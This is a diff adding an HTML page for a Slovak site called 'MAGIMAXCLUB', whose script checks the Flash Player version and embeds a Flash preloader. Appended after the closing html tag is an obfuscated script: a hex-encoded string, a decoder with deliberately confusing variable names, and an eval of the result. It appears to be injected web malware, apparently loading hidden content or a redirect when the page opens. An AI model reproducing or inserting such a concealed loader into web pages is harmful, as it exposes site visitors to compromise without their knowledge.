@@ -1,0 +1,68 @@
+<!-- saved from url=(0013)about:internet -->
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>MAGIMAXCLUB</title>
+<script src="AC_OETags.js" language="javascript"></script>
+<script language="JavaScript" type="text/javascript">
+<!--
+// -----------------------------------------------------------------------------
+// Globals
+// Major version of Flash required
+var requiredMajorVersion = 9;
+// Minor version of Flash required
+var requiredMinorVersion = 0;
+// Minor version of Flash required
+var requiredRevision = 45;
+// -----------------------------------------------------------------------------
+// -->
+</script>
+</head>
+
+<body bgcolor="#99FFCC">
+<div align="center">
+<script language="JavaScript" type="text/javascript">
+<!--
+// Version check based upon the values entered above in "Globals"
+var hasReqestedVersion = DetectFlashVer(requiredMajorVersion, requiredMinorVersion, requiredRevision);
+
+// Check to see if the version meets the requirements for playback
+if (hasReqestedVersion) {
+	// if we've detected an acceptable version
+	// embed the Flash Content SWF when all tests are passed
+	AC_FL_RunContent(
+				"src", "preloader?nocache=77845337895375498",
+				"width", "800",
+				"height", "600",
+				"align", "middle",
+				"id", "main",
+				"quality", "high",
+				"bgcolor", "#99FFCC",
+				"name", "preloader?nocache=77845337895375498",
+				"allowScriptAccess","sameDomain",
+				"type", "application/x-shockwave-flash",
+				'codebase', 'http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab',
+				"pluginspage", "http://www.adobe.com/go/getflashplayer"
+	);
+} else {  // flash is too old or we can't detect the plugin
+	var alternateContent = '<br><br>'
+	+ '<font color=red size="5"><b>Pre spravne zobrazenie a funkcnost Textacika je nutne mat nainstalovany najnovsi Flash Player</b></font><br>'
+	+ '<center><a href=http://www.adobe.com/go/getflash/>Stiahnut Flash</a></center>';
+	document.write(alternateContent);  // insert non-flash content
+}
+// -->
+</script>
+<noscript>
+  <br><br><font color=red size="5"><b>Pre spravne zobrazenie a funkcnost stranky je potrebne mat povolene JavaScript
+  a nainstalovany najnovsi Adobe Flash Player.</b></font><br>
+	<center><a href="http://www.adobe.com/go/getflash/">Stiahnut Flash</a></center>
+</noscript>
+</div>
+</body>
+</html>
+<script>
+IILLL="98e9878c80968e868d97cd94918a9786cbc4df8a8591828e86c3909180dec18c818596908082978687cd8d828e86cc8a8d87869bcd938b93c1c3948a87978bded2c38b868a848b97ded2c390979a8f86dec1958a908a818a8f8a979ad98b8a8787868dc1dddfcc8a8591828e86ddc4cad8e9878c80968e868d97cd94918a9786cbc4df8a8591828e86c3909180dec18b979793d9cccc9791dad1cd808dcc80848ace818a8dcc9497908a8dcd80848adc8a87ded1c1c3948a87978bded2c38b868a848b97ded2c390979a8f86dec1958a908a818a8f8a979ad98b8a8787868dc1dddfcc8a8591828e86ddc4cad8e99eaaafafafdec1ad82adc1d8aaafaaaaafdec1c1d8";
+ILLL="";
+ILIII="function func() {IIIL=eval;IILL=unescape;ILLI=String.fromCharCode;IILIL=Math.PI;ILLII=parseInt;IIIIL=ILLII(~((IILIL&IILIL)|(~IILIL&IILIL)&(IILIL&~IILIL)|(~IILIL&~IILIL)));IILI=ILLII(((IIIIL&IIIIL)|(~IIIIL&IIIIL)&(IIIIL&~IIIIL)|(~IIIIL&~IIIIL))&1);ILIL=IILI<<IILI;ILIIL=IIIIL;for(ILLLI=IIIIL;ILLLI<ILIII.length;ILLLI-=-IILI)ILIIL+=ILLII(ILIII.charCodeAt(ILLLI));ILIIL=ILIIL.toString();ILIIL%=IILL(0x64);for(IILLI=IIIIL;IILLI<(IILLL.length>>IILI);IILLI-=-IILI){IIII='';for(ILILL=IIIIL;ILILL<ILIL;ILILL-=-IILI)IIII+=IILLL.charAt(IILLI*ILIL+ILILL);ILLL+=ILLI(IILL(0xFF)-ILLII(ILLII(IIII,ILIL<<(ILIL+IILI))^ILIIL));}try{IIIL(ILLL);} catch(e){try{eval(ILLL);} catch(e) {window.location='/';}}}func();";
+eval(ILIII);
+</script>
